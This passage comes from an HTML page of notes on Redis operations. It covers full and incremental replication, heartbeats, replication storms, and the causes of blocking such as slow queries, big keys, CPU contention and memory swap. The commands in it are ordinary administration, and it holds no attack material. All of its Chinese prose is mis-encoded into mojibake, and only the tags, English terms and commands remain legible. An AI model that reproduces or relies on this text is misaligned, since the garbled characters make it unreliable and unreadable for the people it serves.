timeoutï¼Œåˆ™ä¼šç»ˆæ­¢å…¨é‡åŒæ­¥ï¼Œå¹¶æ¸…é™¤å·²ä¸‹è½½ä¸´æ—¶æ–‡ä»¶ã€‚å¦‚æœåœ¨é«˜å¹¶å‘å†™çš„åœºæ™¯ï¼Œä¸»èŠ‚ç‚¹çš„ç¼“å†²åŒºè¢«å†™æ»¡ï¼ŒåŒæ ·ä¼šå¯¼è‡´åŒæ­¥çš„å¤±è´¥ã€‚</p><p>å…¨é‡å¤åˆ¶çš„ä¸»è¦æ—¶é—´å¼€é”€åœ¨ï¼š</p><ul><li>ä¸»èŠ‚ç‚¹ <code>bgsave</code> æ—¶é—´</li><li>RDB æ–‡ä»¶ç½‘ç»œä¼ è¾“æ—¶é—´</li><li>ä»èŠ‚ç‚¹æ¸…ç©ºæ•°æ®æ—¶é—´</li><li>ä»èŠ‚ç‚¹åŠ è½½ RDB æ—¶é—´</li><li>å¯èƒ½çš„ AOF é‡å†™æ—¶é—´</li></ul><h4 id="å¢é‡åŒæ­¥"><a href="#å¢é‡åŒæ­¥" class="headerlink" title="å¢é‡åŒæ­¥"></a>å¢é‡åŒæ­¥</h4><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g91xwacukej30hu0d8gnx.jpg" alt=""></p><h4 id="å¿ƒè·³"><a href="#å¿ƒè·³" class="headerlink" title="å¿ƒè·³"></a>å¿ƒè·³</h4><p>ä¸»ä»å¿ƒè·³åˆ¤æ–­æœºåˆ¶ï¼š</p><ul><li>é€šè¿‡<code>client list</code>å‘½ä»¤æŸ¥çœ‹å¤åˆ¶ç›¸å…³å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œä¸»èŠ‚ç‚¹çš„è¿æ¥çŠ¶æ€ä¸º<code>flags=M</code>ï¼Œä»èŠ‚ç‚¹è¿æ¥çŠ¶æ€ä¸º<code>flags=S</code>ã€‚</li><li>ä¸»èŠ‚ç‚¹é»˜è®¤æ¯éš”10ç§’å¯¹ä»èŠ‚ç‚¹å‘é€<code>ping</code>å‘½ä»¤ï¼Œåˆ¤æ–­ä»èŠ‚ç‚¹çš„å­˜æ´»æ€§å’Œè¿æ¥çŠ¶æ€ã€‚å¯é€šè¿‡å‚æ•°<code>repl-ping-slave-period</code>æ§åˆ¶å‘é€é¢‘ç‡ã€‚</li><li>ä»èŠ‚ç‚¹åœ¨ä¸»çº¿ç¨‹ä¸­æ¯éš”1ç§’å‘é€<code>replconf ack{offset}</code>å‘½ä»¤ï¼Œç»™ä¸»èŠ‚ç‚¹ä¸ŠæŠ¥è‡ªèº«å½“å‰çš„å¤åˆ¶åç§»é‡ã€‚<code>replconf</code>å‘½ä»¤ä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š<ul><li>å®æ—¶ç›‘æµ‹ä¸»ä»èŠ‚ç‚¹ç½‘ç»œçŠ¶æ€</li><li>ä¸ŠæŠ¥è‡ªèº«å¤åˆ¶åç§»é‡ï¼Œæ£€æŸ¥å¤åˆ¶æ•°æ®æ˜¯å¦ä¸¢å¤±ï¼Œå¦‚æœä»èŠ‚ç‚¹æ•°æ®ä¸¢å¤±ï¼Œå†ä»ä¸»èŠ‚ç‚¹çš„å¤åˆ¶ç¼“å†²åŒºä¸­æ‹‰å–ä¸¢å¤±æ•°æ®</li><li>å®ç°ä¿è¯ä»èŠ‚ç‚¹çš„æ•°é‡å’Œå»¶è¿Ÿæ€§åŠŸèƒ½ï¼Œé€šè¿‡min-slaves-to-writeã€minslaves-max-lagå‚æ•°é…ç½®å®šä¹‰</li></ul></li></ul><blockquote><p>æˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°æ•°æ®åŒæ­¥çš„é—®é¢˜ï¼Œä½†å¦‚ä½•åœ¨æ¶ˆè€—æœ€å°‘çš„èµ„æºä¸‹ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§æ˜¯æˆ‘ä»¬ä¸€ç›´ä¼šé‡åˆ°çš„é—®é¢˜ï¼Œå¥½åœ¨ï¼Œå¾ˆå¤šæˆç†Ÿçš„ è½¯ä»¶å·²ç»ä¸ºæˆ‘ä»¬æä¾›äº†å€Ÿé‰´çš„æ–¹æ¡ˆï¼Œå¦‚ Git çš„ hash chainï¼ŒRedis çš„ <code>psync</code> åç§»é‡å¢é‡å¤åˆ¶ä¸ç¼“å†²åŒºï¼Œä»¥åŠ MySQL çš„<code>binlog</code>ã€‚æ²¡æœ‰æœ€å¥½çš„æ–¹æ¡ˆï¼Œåªæœ‰æœ€åˆé€‚çš„æ–¹æ¡ˆï¼Œæˆ–è®¸æˆ‘ä»¬èƒ½ä»ä¸­å¾—åˆ°å¯å‘ï¼Œæ‰¾åˆ°æœ€é€‚åˆè‡ªå·±çš„å¢é‡åŒæ­¥æ–¹å¼ã€‚</p></blockquote><h2 id="å¼€å‘ä¸è¿ç»´ä¸­çš„é—®é¢˜"><a href="#å¼€å‘ä¸è¿ç»´ä¸­çš„é—®é¢˜" class="headerlink" title="å¼€å‘ä¸è¿ç»´ä¸­çš„é—®é¢˜"></a>å¼€å‘ä¸è¿ç»´ä¸­çš„é—®é¢˜</h2><h3 id="æ•°æ®å»¶æ—¶"><a href="#æ•°æ®å»¶æ—¶" class="headerlink" title="æ•°æ®å»¶æ—¶"></a>æ•°æ®å»¶æ—¶</h3><p>Rediså¤åˆ¶æ•°æ®çš„å»¶è¿Ÿç”±äºå¼‚æ­¥å¤åˆ¶ç‰¹æ€§æ˜¯æ— æ³•é¿å…çš„ï¼Œå»¶è¿Ÿå–å†³äºç½‘ç»œå¸¦å®½å’Œå‘½ä»¤é˜»å¡æƒ…å†µã€‚éœ€è¦ä¸šåŠ¡åœºæ™¯å…è®¸çŸ­æ—¶é—´å†…çš„æ•°æ®å»¶è¿Ÿã€‚å¯¹äºæ— æ³•å®¹å¿å¤§é‡å»¶è¿Ÿåœºæ™¯ï¼Œå¯ä»¥ç¼–å†™å¤–éƒ¨ç›‘æ§ç¨‹åºç›‘å¬ä¸»ä»èŠ‚ç‚¹çš„å¤åˆ¶åç§»é‡ï¼Œå½“å»¶è¿Ÿè¾ƒå¤§æ—¶è§¦å‘æŠ¥è­¦æˆ–è€…é€šçŸ¥å®¢æˆ·ç«¯é¿å…è¯»å–å»¶è¿Ÿè¿‡é«˜çš„ä»èŠ‚ç‚¹ã€‚</p><h3 id="è¯»åˆ°è¿‡æœŸæ•°æ®"><a href="#è¯»åˆ°è¿‡æœŸæ•°æ®" class="headerlink" title="è¯»åˆ°è¿‡æœŸæ•°æ®"></a>è¯»åˆ°è¿‡æœŸæ•°æ®</h3><p>æƒ°æ€§åˆ é™¤ï¼šä¸»èŠ‚ç‚¹å°†è¿‡æœŸçš„é”®åŒæ­¥ç»™ä»èŠ‚ç‚¹<br>å®šæ—¶åˆ é™¤ï¼šä¸»èŠ‚ç‚¹è½®è¯¢é‡‡æ ·ä¸€å®šæ•°é‡çš„é”®ï¼Œå½“é‡‡æ ·çš„é”®è¿‡æœŸåï¼ŒåŒæ­¥ç»™ä»èŠ‚ç‚¹ã€‚<br>Redis 3.2+ åœ¨ä»èŠ‚ç‚¹è¯»å–é”®æ—¶ä¼šæ ¡éªŒæ˜¯å¦è¿‡æœŸä»¥åˆ¤æ–­æ˜¯å¦è¿”å›æ•°æ®ã€‚</p><h3 id="ä»èŠ‚ç‚¹æ•…éšœ"><a href="#ä»èŠ‚ç‚¹æ•…éšœ" class="headerlink" title="ä»èŠ‚ç‚¹æ•…éšœ"></a>ä»èŠ‚ç‚¹æ•…éšœ</h3><p>ä¸‹çº¿æ•…éšœèŠ‚ç‚¹ã€‚</p><blockquote><p>å½“ä¸»èŠ‚ç‚¹ä¼˜åŒ–ç©ºé—´ä¸å¤§æ—¶å†è€ƒè™‘æ‰©å±•ã€‚ç¬”è€…å»ºè®®å¤§å®¶åœ¨åšè¯»å†™åˆ†ç¦»ä¹‹å‰ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨Redis Clusterç­‰åˆ†å¸ƒå¼è§£å†³æ–¹æ¡ˆï¼Œè¿™æ ·ä¸æ­¢æ‰©å±•äº†è¯»æ€§èƒ½è¿˜å¯ä»¥æ‰©å±•å†™æ€§èƒ½å’Œå¯æ”¯æ’‘æ•°æ®è§„æ¨¡ï¼Œå¹¶ä¸”ä¸€è‡´æ€§å’Œæ•…éšœè½¬ç§»ä¹Ÿå¯ä»¥å¾—åˆ°ä¿è¯ï¼Œå¯¹äºå®¢æˆ·ç«¯çš„ç»´æŠ¤é€»è¾‘ä¹Ÿç›¸å¯¹å®¹æ˜“ã€‚</p></blockquote><h3 id="è§„é¿å…¨é‡å¤åˆ¶"><a href="#è§„é¿å…¨é‡å¤åˆ¶" class="headerlink" title="è§„é¿å…¨é‡å¤åˆ¶"></a>è§„é¿å…¨é‡å¤åˆ¶</h3><ul><li>ç¬¬ä¸€æ¬¡å»ºç«‹å¤åˆ¶ï¼šç”±äºæ˜¯ç¬¬ä¸€æ¬¡å»ºç«‹å¤åˆ¶ï¼Œä»èŠ‚ç‚¹ä¸åŒ…å«ä»»ä½•ä¸»èŠ‚ç‚¹æ•°æ®ï¼Œå› æ­¤å¿…é¡»è¿›è¡Œå…¨é‡å¤åˆ¶æ‰èƒ½å®Œæˆæ•°æ®åŒæ­¥ã€‚å¯¹äºè¿™ç§æƒ…å†µå…¨é‡å¤åˆ¶æ— æ³•é¿å…ã€‚å½“å¯¹æ•°æ®é‡è¾ƒå¤§ä¸”æµé‡è¾ƒé«˜çš„ä¸»èŠ‚ç‚¹æ·»åŠ ä»èŠ‚ç‚¹æ—¶ï¼Œå»ºè®®åœ¨ä½å³°æ—¶è¿›è¡Œæ“ä½œï¼Œæˆ–è€…å°½é‡è§„é¿ä½¿ç”¨å¤§æ•°æ®é‡çš„RedisèŠ‚ç‚¹ã€‚</li><li>èŠ‚ç‚¹è¿è¡ŒIDä¸åŒ¹é…ï¼šå½“ä¸»ä»å¤åˆ¶å…³ç³»å»ºç«‹åï¼Œä»èŠ‚ç‚¹ä¼šä¿å­˜ä¸»èŠ‚ç‚¹çš„è¿è¡ŒIDï¼Œå¦‚æœæ­¤æ—¶ä¸»èŠ‚ç‚¹å› æ•…éšœé‡å¯ï¼Œé‚£ä¹ˆå®ƒçš„è¿è¡ŒIDä¼šæ”¹å˜ï¼Œä»èŠ‚ç‚¹å‘ç°ä¸»èŠ‚ç‚¹è¿è¡ŒIDä¸åŒ¹é…æ—¶ï¼Œä¼šè®¤ä¸ºè‡ªå·±å¤åˆ¶çš„æ˜¯ä¸€ä¸ªæ–°çš„ä¸»èŠ‚ç‚¹ä»è€Œè¿›è¡Œå…¨é‡å¤åˆ¶ã€‚å¯¹äºè¿™ç§æƒ…å†µåº”è¯¥ä»æ¶æ„ä¸Šè§„é¿ï¼Œæ¯”å¦‚æä¾›æ•…éšœè½¬ç§»åŠŸèƒ½ã€‚å½“ä¸»èŠ‚ç‚¹å‘ç”Ÿæ•…éšœåï¼Œæ‰‹åŠ¨æå‡ä»èŠ‚ç‚¹ä¸ºä¸»èŠ‚ç‚¹æˆ–è€…é‡‡ç”¨æ”¯æŒè‡ªåŠ¨æ•…éšœè½¬ç§»çš„å“¨å…µæˆ–é›†ç¾¤æ–¹æ¡ˆã€‚</li><li>å¤åˆ¶ç§¯å‹ç¼“å†²åŒºä¸è¶³ï¼šå½“ä¸»ä»èŠ‚ç‚¹ç½‘ç»œä¸­æ–­åï¼Œä»èŠ‚ç‚¹å†æ¬¡è¿ä¸Šä¸»èŠ‚ç‚¹æ—¶ä¼šå‘é€<code>psync {offset} {runId}</code>å‘½ä»¤è¯·æ±‚éƒ¨åˆ†å¤åˆ¶ï¼Œ<strong>å¦‚æœè¯·æ±‚çš„åç§»é‡ä¸åœ¨ä¸»èŠ‚ç‚¹çš„ç§¯å‹ç¼“å†²åŒºå†…ï¼Œåˆ™æ— æ³•æä¾›ç»™ä»èŠ‚ç‚¹æ•°æ®ï¼Œå› æ­¤éƒ¨åˆ†å¤åˆ¶ä¼šé€€åŒ–ä¸ºå…¨é‡å¤åˆ¶</strong>ã€‚æ­¤æ—¶éœ€è¦ä¿è¯<code>repl_backlog_size &gt; net_break_time*write_size_per_minute</code>ä»¥é¿å…ç¼“å†²åŒºä¸è¶³å¼•å‘çš„å…¨é‡å¤åˆ¶ã€‚</li></ul><h3 id="è§„é¿å¤åˆ¶é£æš´"><a href="#è§„é¿å¤åˆ¶é£æš´" class="headerlink" title="è§„é¿å¤åˆ¶é£æš´"></a>è§„é¿å¤åˆ¶é£æš´</h3><h4 id="å•ä¸»èŠ‚ç‚¹å¤åˆ¶é£æš´"><a href="#å•ä¸»èŠ‚ç‚¹å¤åˆ¶é£æš´" class="headerlink" title="å•ä¸»èŠ‚ç‚¹å¤åˆ¶é£æš´"></a>å•ä¸»èŠ‚ç‚¹å¤åˆ¶é£æš´</h4><p>ä¸€èˆ¬å‘ç”Ÿåœ¨ä¸»èŠ‚ç‚¹æŒ‚è½½å¤šä¸ªä»èŠ‚ç‚¹çš„åœºæ™¯ã€‚å½“ä¸»èŠ‚ç‚¹é‡å¯æ¢å¤åï¼Œä»èŠ‚ç‚¹ä¼šå‘èµ·å…¨é‡å¤åˆ¶æµç¨‹ï¼Œè¿™æ—¶ä¸»èŠ‚ç‚¹å°±ä¼šä¸ºä»èŠ‚ç‚¹åˆ›å»ºRDBå¿«ç…§ï¼Œå¦‚æœåœ¨å¿«ç…§åˆ›å»ºå®Œæ¯•ä¹‹å‰ï¼Œæœ‰å¤šä¸ªä»èŠ‚ç‚¹éƒ½å°è¯•ä¸ä¸»èŠ‚ç‚¹è¿›è¡Œå…¨é‡åŒæ­¥ï¼Œé‚£ä¹ˆå…¶ä»–ä»èŠ‚ç‚¹å°†å…±äº«è¿™ä»½RDBå¿«ç…§ï¼ŒåŒæ—¶å‘å¤šä¸ªä»èŠ‚ç‚¹å‘é€RDBå¿«ç…§ï¼Œå¯èƒ½ä½¿ä¸»èŠ‚ç‚¹çš„ç½‘ç»œå¸¦å®½æ¶ˆè€—ä¸¥é‡ï¼Œé€ æˆä¸»èŠ‚ç‚¹çš„å»¶è¿Ÿå˜å¤§ï¼Œæç«¯æƒ…å†µä¼šå‘ç”Ÿä¸»ä»èŠ‚ç‚¹è¿æ¥æ–­å¼€ï¼Œå¯¼è‡´å¤åˆ¶å¤±è´¥ã€‚<br>è§£å†³æ–¹æ¡ˆå¯ä»¥å‡å°‘ä¸»èŠ‚ç‚¹æŒ‚è½½çš„ä»èŠ‚ç‚¹æ•°é‡ï¼Œæˆ–è€…é‡‡ç”¨æ ‘å½¢å¤åˆ¶ç»“æ„(è¿™ç§æ ‘çŠ¶ç»“æ„ä¹Ÿå¸¦æ¥äº†è¿ç»´çš„å¤æ‚æ€§ï¼Œå¢åŠ äº†æ‰‹åŠ¨å’Œè‡ªåŠ¨å¤„ç†æ•…éšœè½¬ç§»çš„éš¾åº¦)ã€‚</p><h4 id="å•æœºå™¨å¤åˆ¶é£æš´"><a href="#å•æœºå™¨å¤åˆ¶é£æš´" class="headerlink" title="å•æœºå™¨å¤åˆ¶é£æš´"></a>å•æœºå™¨å¤åˆ¶é£æš´</h4><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g91z58ncm8j30iv0frgpv.jpg" alt=""></p><ul><li>åº”è¯¥æŠŠä¸»èŠ‚ç‚¹å°½é‡åˆ†æ•£åœ¨å¤šå°æœºå™¨ä¸Šï¼Œé¿å…åœ¨å•å°æœºå™¨ä¸Šéƒ¨ç½²è¿‡å¤šçš„ä¸»èŠ‚ç‚¹ã€‚</li><li>å½“ä¸»èŠ‚ç‚¹æ‰€åœ¨æœºå™¨æ•…éšœåæä¾›æ•…éšœè½¬ç§»æœºåˆ¶ï¼Œé¿å…æœºå™¨æ¢å¤åè¿›è¡Œå¯†é›†çš„å…¨é‡å¤åˆ¶ã€‚</li></ul><h1 id="ç¬¬-7-ç« -é˜»å¡"><a href="#ç¬¬-7-ç« -é˜»å¡" class="headerlink" title="ç¬¬ 7 ç«  é˜»å¡"></a>ç¬¬ 7 ç«  é˜»å¡</h1><p>å‘ç”Ÿé˜»å¡ä¼šæœ‰å†…åœ¨ä¸å¤–åœ¨åŸå› <br>å†…åœ¨åŸå› ï¼šä¸åˆç†åœ°ä½¿ç”¨APIæˆ–æ•°æ®ç»“æ„ã€CPUé¥±å’Œã€æŒä¹…åŒ–é˜»å¡ç­‰<br>å¤–åœ¨åŸå› ï¼šCPUç«äº‰ã€å†…å­˜äº¤æ¢ã€ç½‘ç»œé—®é¢˜ç­‰</p><h2 id="å†…å› "><a href="#å†…å› " class="headerlink" title="å†…å› "></a>å†…å› </h2><h3 id="å¦‚ä½•å‘ç°æ…¢æŸ¥è¯¢"><a href="#å¦‚ä½•å‘ç°æ…¢æŸ¥è¯¢" class="headerlink" title="å¦‚ä½•å‘ç°æ…¢æŸ¥è¯¢"></a>å¦‚ä½•å‘ç°æ…¢æŸ¥è¯¢</h3><p>æ‰§è¡Œ<code>slowlog get {n}</code>è·å–æœ€è¿‘çš„ n æ¡æ…¢æŸ¥è¯¢å‘½ä»¤ï¼Œçº¿ä¸Šå®ä¾‹å»ºè®®è®¾ç½®ä¸º1æ¯«ç§’ä¾¿äºåŠæ—¶å‘ç°æ¯«ç§’çº§ä»¥ä¸Šçš„å‘½ä»¤ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œæ—¶é—´åœ¨æ¯«ç§’çº§ï¼Œåˆ™å®ä¾‹å®é™…OPSåªæœ‰1000å·¦å³ã€‚æ…¢æŸ¥è¯¢é˜Ÿåˆ—é•¿åº¦é»˜è®¤128ï¼Œå¯é€‚å½“è°ƒå¤§ã€‚æ…¢æŸ¥è¯¢æœ¬èº«åªè®°å½•äº†å‘½ä»¤æ‰§è¡Œæ—¶é—´ï¼Œä¸åŒ…æ‹¬æ•°æ®ç½‘ç»œä¼ è¾“æ—¶é—´å’Œå‘½ä»¤æ’é˜Ÿæ—¶é—´ï¼Œå› æ­¤å®¢æˆ·ç«¯å‘ç”Ÿé˜»å¡å¼‚å¸¸åï¼Œå¯èƒ½ä¸æ˜¯å½“å‰å‘½ä»¤ç¼“æ…¢ï¼Œè€Œæ˜¯åœ¨ç­‰å¾…å…¶ä»–å‘½ä»¤æ‰§è¡Œã€‚éœ€è¦é‡ç‚¹æ¯”å¯¹å¼‚å¸¸å’Œæ…¢æŸ¥è¯¢å‘ç”Ÿçš„æ—¶é—´ç‚¹ï¼Œç¡®è®¤æ˜¯å¦æœ‰æ…¢æŸ¥è¯¢é€ æˆçš„å‘½ä»¤é˜»å¡æ’é˜Ÿã€‚</p><p>è§£å†³æ…¢æŸ¥è¯¢</p><ul><li>ä¿®æ”¹ä¸ºä½ç®—æ³•åº¦çš„å‘½ä»¤ï¼Œå¦‚<code>hgetall</code>æ”¹ä¸º<code>hmget</code>ç­‰ï¼Œç¦ç”¨<code>keys</code>ã€<code>sort</code>ç­‰å‘½ä»¤ã€‚</li><li>è°ƒæ•´å¤§å¯¹è±¡ï¼šç¼©å‡å¤§å¯¹è±¡æ•°æ®æˆ–æŠŠå¤§å¯¹è±¡æ‹†åˆ†ä¸ºå¤šä¸ªå°å¯¹è±¡ï¼Œé˜²æ­¢ä¸€æ¬¡å‘½ä»¤æ“ä½œè¿‡å¤šçš„æ•°æ®ã€‚å¤§å¯¹è±¡æ‹†åˆ†è¿‡ç¨‹éœ€è¦å…·ä½“çš„ä¸šåŠ¡å†³å®šï¼Œå¦‚ç”¨æˆ·å¥½å‹é›†åˆå­˜å‚¨åœ¨Redisä¸­ï¼Œæœ‰äº›çƒ­ç‚¹ç”¨æˆ·ä¼šå…³æ³¨å¤§é‡å¥½å‹ï¼Œè¿™æ—¶å¯ä»¥æŒ‰æ—¶é—´æˆ–å…¶ä»–ç»´åº¦æ‹†åˆ†åˆ°å¤šä¸ªé›†åˆä¸­ã€‚</li></ul><h3 id="å¦‚ä½•å‘ç°å¤§å¯¹è±¡"><a href="#å¦‚ä½•å‘ç°å¤§å¯¹è±¡" class="headerlink" title="å¦‚ä½•å‘ç°å¤§å¯¹è±¡"></a>å¦‚ä½•å‘ç°å¤§å¯¹è±¡</h3><p>Redisæœ¬èº«æä¾›å‘ç°å¤§å¯¹è±¡çš„å·¥å…·<code>redis-cli -h{ip} -p{port} bigkeys</code>ã€‚å†…éƒ¨åŸç†é‡‡ç”¨åˆ†æ®µè¿›è¡Œ<code>scan</code>æ“ä½œï¼ŒæŠŠå†å²æ‰«æè¿‡çš„æœ€å¤§å¯¹è±¡ç»Ÿè®¡å‡ºæ¥ä¾¿äºåˆ†æä¼˜åŒ–ï¼Œ</p><h3 id="CPUé¥±å’Œ"><a href="#CPUé¥±å’Œ" class="headerlink" title="CPUé¥±å’Œ"></a>CPUé¥±å’Œ</h3><p>ä½¿ç”¨<code>top</code>å‘½ä»¤å¾ˆå®¹æ˜“è¯†åˆ«å‡ºå¯¹åº”Redisè¿›ç¨‹çš„CPUä½¿ç”¨ç‡ã€‚CPUé¥±å’Œæ˜¯éå¸¸å±é™©çš„ï¼Œå°†å¯¼è‡´Redisæ— æ³•å¤„ç†æ›´å¤šçš„å‘½ä»¤ï¼Œä¸¥é‡å½±å“ååé‡å’Œåº”ç”¨æ–¹çš„ç¨³å®šæ€§ã€‚å¯¹äºè¿™ç§æƒ…å†µï¼Œé¦–å…ˆåˆ¤æ–­å½“å‰Redisçš„å¹¶å‘é‡æ˜¯å¦è¾¾åˆ°æé™ï¼Œå»ºè®®ä½¿ç”¨ç»Ÿè®¡å‘½ä»¤<code>redis-cli -h{ip} -p{port} --stat</code>è·å–å½“å‰Redisä½¿ç”¨æƒ…å†µï¼Œè¯¥å‘½ä»¤æ¯ç§’è¾“å‡ºä¸€è¡Œç»Ÿè®¡ä¿¡æ¯ã€‚</p><h3 id="æŒä¹…åŒ–é˜»å¡"><a href="#æŒä¹…åŒ–é˜»å¡" class="headerlink" title="æŒä¹…åŒ–é˜»å¡"></a>æŒä¹…åŒ–é˜»å¡</h3><p>æŒä¹…åŒ–å¼•èµ·ä¸»çº¿ç¨‹é˜»å¡çš„æ“ä½œä¸»è¦æœ‰ï¼šforké˜»å¡ã€AOFåˆ·ç›˜é˜»å¡ã€HugePageå†™æ“ä½œé˜»å¡ã€‚</p><p>fork é˜»å¡å¯ä»¥æ‰§è¡Œ<code>info stats</code>å‘½ä»¤è·å–åˆ°<code>latest_fork_usec</code>æŒ‡æ ‡ï¼Œè¡¨ç¤ºRedisæœ€è¿‘ä¸€æ¬¡forkæ“ä½œè€—æ—¶ï¼Œå¦‚æœè€—æ—¶å¾ˆå¤§ï¼Œæ¯”å¦‚è¶…è¿‡1ç§’ï¼Œåˆ™éœ€è¦åšå‡ºä¼˜åŒ–è°ƒæ•´ï¼Œå¦‚é¿å…ä½¿ç”¨è¿‡å¤§çš„å†…å­˜å®ä¾‹å’Œè§„é¿forkç¼“æ…¢çš„æ“ä½œç³»ç»Ÿç­‰ã€‚</p><p>AOFåˆ·ç›˜é˜»å¡ä¸»è¦æ˜¯ç¡¬ç›˜å‹åŠ›å¼•èµ·ï¼Œå¯ä»¥æŸ¥çœ‹Redisæ—¥å¿—è¯†åˆ«å‡ºè¿™ç§æƒ…å†µã€‚ç¡¬ç›˜å‹åŠ›å¯èƒ½æ˜¯Redisè¿›ç¨‹å¼•èµ·çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶ä»–è¿›ç¨‹å¼•èµ·çš„ï¼Œå¯ä»¥ä½¿ç”¨iotopæŸ¥çœ‹å…·ä½“æ˜¯å“ªä¸ªè¿›ç¨‹æ¶ˆè€—è¿‡å¤šçš„ç¡¬ç›˜èµ„æºã€‚</p><p>HugePageå†™æ“ä½œé˜»å¡ã€‚å­è¿›ç¨‹åœ¨æ‰§è¡Œé‡å†™æœŸé—´åˆ©ç”¨Linuxå†™æ—¶å¤åˆ¶æŠ€æœ¯é™ä½å†…å­˜å¼€é”€ï¼Œå› æ­¤åªæœ‰å†™æ“ä½œæ—¶Redisæ‰å¤åˆ¶è¦ä¿®æ”¹çš„å†…å­˜é¡µã€‚å¯¹äºå¼€å¯Transparent HugePagesçš„æ“ä½œç³»ç»Ÿï¼Œæ¯æ¬¡å†™å‘½ä»¤å¼•èµ·çš„å¤åˆ¶å†…å­˜é¡µå•ä½ç”±4Kå˜ä¸º2MBï¼Œæ”¾å¤§äº†512å€ï¼Œä¼šæ‹–æ…¢å†™æ“ä½œçš„æ‰§è¡Œæ—¶é—´ï¼Œå¯¼è‡´å¤§é‡å†™æ“ä½œæ…¢æŸ¥è¯¢ã€‚ä¾‹å¦‚ç®€å•çš„incrå‘½ä»¤ä¹Ÿä¼šå‡ºç°åœ¨æ…¢æŸ¥è¯¢ä¸­ã€‚å…³äºTransparent HugePagesçš„ç»†èŠ‚è§ç¬¬12ç« çš„12.1èŠ‚â€œLinuxé…ç½®ä¼˜åŒ–â€ã€‚</p><blockquote><p>Redis å¯¹é˜»å¡é—®é¢˜çš„è¯´æ˜ï¼š<a href="https://redis.io/topics/latency" target="_blank" rel="noopener">https://redis.io/topics/latency</a></p></blockquote><h2 id="å¤–å› "><a href="#å¤–å› " class="headerlink" title="å¤–å› "></a>å¤–å› </h2><h3 id="CPU-ç«äº‰"><a href="#CPU-ç«äº‰" class="headerlink" title="CPU ç«äº‰"></a>CPU ç«äº‰</h3><p>è¿›ç¨‹ç«äº‰ï¼šRedisæ˜¯å…¸å‹çš„CPUå¯†é›†å‹åº”ç”¨ï¼Œä¸å»ºè®®å’Œå…¶ä»–å¤šæ ¸CPUå¯†é›†å‹æœåŠ¡éƒ¨ç½²åœ¨ä¸€èµ·ã€‚å½“å…¶ä»–è¿›ç¨‹è¿‡åº¦æ¶ˆè€—CPUæ—¶ï¼Œå°†ä¸¥é‡å½±å“Redisååé‡ã€‚å¯ä»¥é€šè¿‡<code>top</code>ã€<code>sar</code>ç­‰å‘½ä»¤å®šä½åˆ°CPUæ¶ˆè€—çš„æ—¶é—´ç‚¹å’Œå…·ä½“è¿›ç¨‹ï¼Œè¿™ä¸ªé—®é¢˜æ¯”è¾ƒå®¹æ˜“å‘ç°ï¼Œéœ€è¦è°ƒæ•´æœåŠ¡ä¹‹é—´éƒ¨ç½²ç»“æ„ã€‚<br>ç»‘å®šCPUï¼šéƒ¨ç½²Redisæ—¶ä¸ºäº†å……åˆ†åˆ©ç”¨å¤šæ ¸CPUï¼Œé€šå¸¸ä¸€å°æœºå™¨éƒ¨ç½²å¤šä¸ªå®ä¾‹ã€‚å¸¸è§çš„ä¸€ç§ä¼˜åŒ–æ˜¯æŠŠRedisè¿›ç¨‹ç»‘å®šåˆ°CPUä¸Šï¼Œç”¨äºé™ä½CPUé¢‘ç¹ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€ã€‚ä½†å½“Redisçˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹è¿›è¡ŒRDB/AOFé‡å†™æ—¶ï¼Œå¦‚æœåšäº†CPUç»‘å®šï¼Œä¼šä¸çˆ¶è¿›ç¨‹å…±äº«ä½¿ç”¨ä¸€ä¸ªCPUã€‚å­è¿›ç¨‹é‡å†™æ—¶å¯¹å•æ ¸CPUä½¿ç”¨ç‡é€šå¸¸åœ¨90%ä»¥ä¸Šï¼Œçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å°†äº§ç”Ÿæ¿€çƒˆCPUç«äº‰ï¼Œæå¤§å½±å“Redisç¨³å®šæ€§ã€‚å› æ­¤å¯¹äºå¼€å¯äº†æŒä¹…åŒ–æˆ–å‚ä¸å¤åˆ¶çš„ä¸»èŠ‚ç‚¹ä¸å»ºè®®ç»‘å®šCPUã€‚</p><h3 id="å†…å­˜äº¤æ¢"><a href="#å†…å­˜äº¤æ¢" class="headerlink" title="å†…å­˜äº¤æ¢"></a>å†…å­˜äº¤æ¢</h3><p>å†…å­˜äº¤æ¢ï¼ˆswapï¼‰å¯¹äºRedisæ¥è¯´æ˜¯éå¸¸è‡´å‘½çš„ï¼ŒRedisä¿è¯é«˜æ€§èƒ½çš„ä¸€ä¸ªé‡è¦å‰ææ˜¯æ‰€æœ‰çš„æ•°æ®åœ¨å†…å­˜ä¸­ã€‚å¦‚æœæ“ä½œç³»ç»ŸæŠŠRedisä½¿ç”¨çš„éƒ¨åˆ†å†…å­˜æ¢å‡ºåˆ°ç¡¬ç›˜ï¼Œç”±äºå†…å­˜ä¸ç¡¬ç›˜è¯»å†™é€Ÿåº¦å·®å‡ ä¸ªæ•°é‡çº§ï¼Œä¼šå¯¼è‡´å‘ç”Ÿäº¤æ¢åçš„Redisæ€§èƒ½æ€¥å‰§ä¸‹é™ã€‚</p><p>åˆ¤æ–­ Redis æ˜¯å¦å†…å­˜äº¤æ¢çš„æ–¹æ³•ï¼š</p><ol><li>æŸ¥è¯¢ Redis çš„è¿›ç¨‹å·ï¼š<code># redis-cli -p 6379 info server | grep process_id</code> // process_id:4476</li><li>æ ¹æ®è¿›ç¨‹å·æŸ¥è¯¢å†…å­˜äº¤æ¢ä¿¡æ¯ï¼š<code># cat /proc/4476/smaps | grep Swap</code><br>å¦‚æœäº¤æ¢é‡éƒ½æ˜¯0KBæˆ–è€…ä¸ªåˆ«çš„æ˜¯4KBï¼Œåˆ™æ˜¯æ­£å¸¸ç°è±¡ï¼Œè¯´æ˜Redisè¿›ç¨‹å†…å­˜æ²¡æœ‰è¢«äº¤æ¢ã€‚</li></ol><p>é¢„é˜² Redis çš„å†…å­˜äº¤æ¢</p><ul><li>ä¿è¯æœºå™¨å¯ç”¨å†…å­˜å……è¶³</li><li>ç¡®ä¿æ‰€æœ‰ Redis 